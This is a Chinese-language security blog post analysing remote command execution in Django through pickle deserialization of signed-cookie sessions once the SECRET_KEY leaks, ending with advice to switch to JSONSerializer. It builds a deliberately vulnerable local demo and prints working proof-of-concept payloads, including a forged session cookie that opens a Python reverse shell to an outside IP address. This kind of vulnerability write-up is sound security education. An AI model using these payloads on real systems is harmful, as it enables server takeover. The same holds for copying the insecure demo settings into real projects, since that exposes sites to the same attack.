---
layout: post
title: Django 远程命令执行漏洞详解
tags: [web, security, exploit]
---

### 一、背景

首先简单谈谈 Python 中的序列化模块。Python 中关于 `pickle` 序列化导致的任意命令执行问题早在 2002 年时就已经被提及，经过了长时间的测试和挖掘，其利用方法趋于固定，其 demo 如下：

`serializer.py` （用以生成序列化后的 payload）

```python
import base64
try:
    import cPickle as pickle
except:
    import pickle
    
    
class Whoami(object):
    def __reduce__(self):
        import os
        return (os.system, ('whoami', ))
    
sess = base64.b64encode(pickle.dumps(Whoami()))
print sess
```

代码执行后得到序列化后的字串：`Y3Bvc2l4CnN5c3RlbQpwMQooUyd3aG9hbWknCnAyCnRwMwpScDQKLg==`

`unserializer.py`（用以反序列化字符串生成对象）

```python
import sys
import base64
try:
    import cPickle as pickle
except:
    import pickle

pickle.loads(base64.b64decode(sys.argv[1]))
```

将前面的得到的序列化字串 `Y3Bvc2l4CnN5c3RlbQpwMQooUyd3aG9hbWknCnAyCnRwMwpScDQKLg==` 作为代码参数传入，得到输出：

![](/images/articles/2015-09-12-django-command-execution-analysis/1.png)

可以看到 `whoami` 命令得到了执行，关于 `pickle` 的详细说明可参考[官方文档](https://docs.python.org/2/library/pickle.html)。

### 二、分析

简单的说明了 Python 中序列化导致的任意命令执行问题后，再来看看 Django 中与其相关的地方。（下面以 Django 1.5.12 作为环境进行示例说明）

在 Django 中，老版本（1.6以下）默认使用 `PickleSerializer()` 对 `session` 进行序列化，高版本中则使用 `JSONSerializer()` 对 `session` 进行序列化操作。

而 `PickleSerializer()` 的序列化则使用了 Python 中内置模块 `cPickle` 和 `pickle`。其类定义位于 `django/contrib/sessions/serializers.py` 中：

```python
from django.core.signing import JSONSerializer as BaseJSONSerializer
try:
    from django.utils.six.moves import cPickle as pickle
except ImportError:
    import pickle


class PickleSerializer(object):
    """
    Simple wrapper around pickle to be used in signing.dumps and
    signing.loads.
    """
    def dumps(self, obj):
        return pickle.dumps(obj, pickle.HIGHEST_PROTOCOL)

    def loads(self, data):
        print 'loads() method called'
        return pickle.loads(data)


JSONSerializer = BaseJSONSerializer
```

若 Django 项目中配置了 session 序列化处理为 `PickleSerializer()`，即：

    SESSION_SERIALIZER = 'django.contrib.sessions.serializers.PickleSerializer'
	
其所有关于用户 session 的操作（序列化，反序列化等）都会使用其配置的方法对其进行处理。

Django 在处理用户请求和响应用户请求时都会调用会话中间件对其进行操作，中间件定义位于 `django/ontrib/sessions/middleware.py`，内容如下：

```python
class SessionMiddleware(object):
    def process_request(self, request):
        engine = import_module(settings.SESSION_ENGINE)
        session_key = request.COOKIES.get(settings.SESSION_COOKIE_NAME, None)  # 从用户请求的 Cookies 中获取配置中设置好的 session 名，默认为 "sessionid"
        request.session = engine.SessionStore(session_key)  # 使用 session 引擎对获取的 session 值进行初始化操作 SessionStore()

    def process_response(self, request, response):
        """
        If request.session was modified, or if the configuration is to save the
        session every time, save the changes and set a session cookie.
        """
    (...省略)
```

当用户访问时会初始化 session 处理类，若服务端对用户会话信息进行访问或者修改，都会反序列化用户所传递的 session 值，然后从中读取数据。

综上看来，如果 session 可控，攻击者就可以构造出包含有恶意代码的序列化字串，将其传递给服务器，服务器在解析即反序列化 session 的同时，就有可能导致任意命令执行。当然了，攻击者想要成功构造出有效的 session 值，有两个必要条件：

1. session 可控（即以 Cookies 等形式存储于客户端）
2. 服务器上用以加密、验证等操作使用的 SECRET_KEY

关于第一点，Django 中有多种 session 存储的方式，如：db、file、cookies 等。假设某一个 Django 项目使用了 cookies 作为它的 session 处理引擎，即在 `settings.py` 中有如下配置：

    SESSION_ENGINE = 'django.contrib.sessions.backends.signed_cookies'
	
这样一来，第一条件就可以满足了，所有关于用户的会话信息都以密文的形式存储在客户端。（事实证明，这样配置的 Django 项目的确不在少数）

![](/images/articles/2015-09-12-django-command-execution-analysis/2.png)

使用了 cookies 作为 session 处理引擎，其对 session 的读取会通过前面提到的序列化处理过程进行处理。关键代码位于 `django/contrib/sessions/backends/signed_cookies.py` 中：

```python
class SessionStore(SessionBase):

    # 当后端访问会话数据时（例如 request.session['admin']）会使用 load() 函数载入加密的 session 数据，
    def load(self):
        """
        We load the data from the key itself instead of fetching from
        some external data store. Opposite of _get_session_key(),
        raises BadSignature if signature fails.
        """
        try:
            return signing.loads(self.session_key,  # 加密后的 session 值
                serializer=self.serializer,  # 若配置中设置了 PickleSerializer()，最终会调用 pickle 或者 cPickle 模块
                # This doesn't handle non-default expiry dates, see #19201
                max_age=settings.SESSION_COOKIE_AGE,  # session 的过期时间
                salt='django.contrib.sessions.backends.signed_cookies')  # 用以验证 session 有效性的盐值，默认为项目中的 SECRET_KEY
        except (signing.BadSignature, ValueError):
            # 当用户的 session 验证失败时，会创建新的 session
            self.create()
        return {}

    (...省略)
```

关于第一点的说明到这里就足够了。再来说说第二条件即安全密钥-`SECRET_KEY`，作为 Django 项目中最核心的密钥，通常情况下是不可能外泄的，但是凡事都有不能预料的时候，例如，开发人员疏忽将 `SECRET_KEY` 作为一个 api 密钥加载于 JS 中，又或者项目中存在任意文件下载漏洞，攻击者通过下载 `settings.py` 文件读取到了密钥 `SECRET_KEY` 的值，其他种种诸如此类的原因致使 `SECRET_KEY` 泄露成为可能。

若同时满足上述两个条件，并且使用了 `PickleSerializer()` 序列化处理过程，那么攻击者就可以构造出恶意的序列化字串，传递给服务器，致使服务器在访问或修改会话信息时调用了相应引擎的 `load()` 函数，反序列化 session 加密字串，触发 `pickle` 任意命令执行漏洞。

### 三、Demo

下面，我们就假设有这么一个站点，同时满足了上面所提到的两个必要条件：`session可控` 和 `SECRET_KEY泄露`，同时序列化过程使用 `PickleSerializer()`，建立一个测试项目名为 `demo`（依次执行下列命令，virtualenv 为 Python 虚拟环境管理，请自行检查或安装）。

    virtualenv --distribute django
    cd django
    . bin/activate
    pip install django==1.5.12
    django-admin.py startproject demo
    cd demo/
    python manage.py startapp vuln

首先给出整个项目的目录树：

![](/images/articles/2015-09-12-django-command-execution-analysis/3.png)

首先设置用户会话引擎和序列化过程处理（1.5.12已将 startproject 创建的项目中的 SESSION_SERIALIZE 设置为了 JSONSerializer，所以按此流程进行测试的时候不要感到奇怪），在 demo/settings.py 文件中设置 `SESSION_ENGINE` 和 `SESSION_SERIALIZER`，并将创建的子应用 `vuln` 加入到 `INSTALL_APPS` 中：

    SESSION_ENGINE = 'django.contrib.sessions.backends.signed_cookies'
    SESSION_SERIALIZER = 'django.contrib.sessions.serializers.PickleSerializer'
	
    ...
	
    INSTALLED_APPS += ('vuln', )
	
通过刚才的命令，已经在 `demo` 项目中创建了一个子应用 `vuln`，编辑 `vuln/views.py` 文件，为其增加需要进行测试的视图，内容如下：

```python
# Create your views here.

from django.conf import settings
from django.shortcuts import HttpResponse


def index(request):
    return HttpResponse('This is index page')


def admin(request):
    try:
        admin = request.session['admin']
    except KeyError:
        return HttpResponse('Get out of here')

    return HttpResponse('Hello admin')


def key(request):
    return HttpResponse('Secret key is: %s' % settings.SECRET_KEY)
```

随后配置路由信息 `demo/urls.py`：

```python
from django.conf.urls import patterns, include, url

# Uncomment the next two lines to enable the admin:
# from django.contrib import admin
# admin.autodiscover()

urlpatterns = patterns('vuln.views',
	url(r'^$', 'index'),
    url(r'^key/$', 'key'),
    url(r'^admin/$', 'admin'),
)
```

将 `demo` 项目跑起来：

    python manage.py runserver 127.0.0.1:8000

这里创建了3个视图 `index`，`admin` 和 `key`，为了测试方便，`http://127.0.0.1:8000/key/` 页面直接输出了该 Django 项目中的 `SECRET_KEY` 值。`http://127.0.0.1:8000/admin/` 页面为一个管理员页面，后端会尝试读取会话信息中 request.session['admin'] 的值，若存在则返回 "Hello admin"，不存在返回 "Get out of here"。

![](/images/articles/2015-09-12-django-command-execution-analysis/4.png)

此处 `SECRET_KEY` 值为：`zur%eblm54)e)ox&-xzbwonmx$=+ijh3dl&6m-mx+1^y(-i09y`

![](/images/articles/2015-09-12-django-command-execution-analysis/5.png)

在用户访问管理页面时，后端尝试读取了 session['admin'] 的值，根据文章第二部分的分析结合此处的模拟环境，我们可以通过得到的 `SECRET_KEY` 来构造一个恶意的序列化字串来执行任意命令。

示例 PoC 如下：

```python
# coding: utf-8
from django.contrib.sessions.serializers import PickleSerializer
from django.core import signing
from django.conf import settings

settings.configure(SECRET_KEY='zur%eblm54)e)ox&-xzbwonmx$=+ijh3dl&6m-mx+1^y(-i09y')  # SECRET_KEY 参数的值为 demo Django 项目的 SECRET_KEY 值


class CreateTmpFile(object):
    def __reduce__(self):
        import subprocess
        return (subprocess.call,
                (['touch',
                  '/tmp/vulnerable'],))


sess = signing.dumps(
    obj=CreateTmpFile(),
    serializer=PickleSerializer,
    salt='django.contrib.sessions.backends.signed_cookies'
)
print sess
```

运行该 PoC 后，得到加密后的 session 值：

    gAJjc3VicHJvY2VzcwpjYWxsCnEBXXECKFUFdG91Y2hxA1UPL3RtcC92dWxuZXJhYmxlcQRlhVJxBS4:1Zb63z:AUICT5WAqW3JrFNYpeR0remUBHI

然后直接请求 `http://127.0.0.1:8000/admin/` 并附上相应的 session 值。

    curl http://127.0.0.1:8000/admin/ --cookie "sessionid=gAJjc3VicHJvY2VzcwpjYWxsCnEBXXECKFUFdG91Y2hxA1UPL3RtcC92dWxuZXJhYmxlcQRlhVJxBS4:1Zb63z:AUICT5WAqW3JrFNYpeR0remUBHI"
	
然后查看 `/tmp` 目录，发现成功创建了 `vulnerable` 文件，命令得到了执行：

![](/images/articles/2015-09-12-django-command-execution-analysis/6.png)

同时服务器也抛出错误：

![](/images/articles/2015-09-12-django-command-execution-analysis/7.png)

下面再给出一 PoC 用以 GetShell：

```python
# coding: utf-8
from django.contrib.sessions.serializers import PickleSerializer
from django.core import signing
from django.conf import settings

settings.configure(SECRET_KEY='zur%eblm54)e)ox&-xzbwonmx$=+ijh3dl&6m-mx+1^y(-i09y')


class GetShellWithPython(object):
    def __reduce__(self):
        import subprocess
        return (subprocess.call,
                (['python',
                  '-c',
                  'import socket,subprocess,os;'
                  's=socket.socket(socket.AF_INET,socket.SOCK_STREAM);'
                  's.connect(("103.224.82.158",31337));'
                  'os.dup2(s.fileno(),0);'
                  'os.dup2(s.fileno(),1);'
                  'os.dup2(s.fileno(),2);'
                  'subprocess.call(["/bin/sh","-i"]);'],))


sess = signing.dumps(
    obj=GetShellWithPython(),
    serializer=PickleSerializer,
    salt='django.contrib.sessions.backends.signed_cookies'
)
print sess
```

运行该 PoC 后，得到加密后的 session 值：

    gAJjc3VicHJvY2VzcwpjYWxsCnEBXXECKFUGcHl0aG9ucQNVAi1jcQRV12ltcG9ydCBzb2NrZXQsc3VicHJvY2VzcyxvcztzPXNvY2tldC5zb2NrZXQoc29ja2V0LkFGX0lORVQsc29ja2V0LlNPQ0tfU1RSRUFNKTtzLmNvbm5lY3QoKCIxMDMuMjI0LjgyLjE1OCIsMzEzMzcpKTtvcy5kdXAyKHMuZmlsZW5vKCksMCk7b3MuZHVwMihzLmZpbGVubygpLDEpO29zLmR1cDIocy5maWxlbm8oKSwyKTtzdWJwcm9jZXNzLmNhbGwoWyIvYmluL3NoIiwiLWkiXSk7cQVlhVJxBi4:1Zb69o:JrnUm9KCbIDWVh13g2i5rY0o11E

然后请求 `http://127.0.0.1:8000/admin/` 并附上相应的 session 值。

![](/images/articles/2015-09-12-django-command-execution-analysis/8.png)

可以看到，已经成功 GetShell。

### 四、小结

通过两个简单的例子来说明了 Django 中如何利用配置缺陷来进行任意命令执行。实例中虽然使用的是 Django-1.5.12 版本，但是需要注意的是，只要满足 2 个必要条件以及使用了 `PickleSerializer()` 处理序列化过程，必然会存在反序列化导致任意命令执行的问题。

避免该问题的最直接方法就是用 `JSONSerializer()` 来代替 `PickleSerializer()` 进行序列化处理，以及避免使用 Cookies 来存放重要的会话信息。

本文虽只给出了 Demo 示例来演示 Django 任意命令执行过程，但足以说明该问题的严重性，应该得到广大开发者（特别是 Python 使用者们）的重视。


### 参考

* [http://drops.wooyun.org/web/8528](http://drops.wooyun.org/web/8528)
* [http://www.securityfocus.com/bid/5255/info](http://www.securityfocus.com/bid/5255/info)
* [http://www.securityfocus.com/bid/5257/info](http://www.securityfocus.com/bid/5257/info)
* [https://blog.nelhage.com/2011/03/exploiting-pickle/](https://blog.nelhage.com/2011/03/exploiting-pickle/)
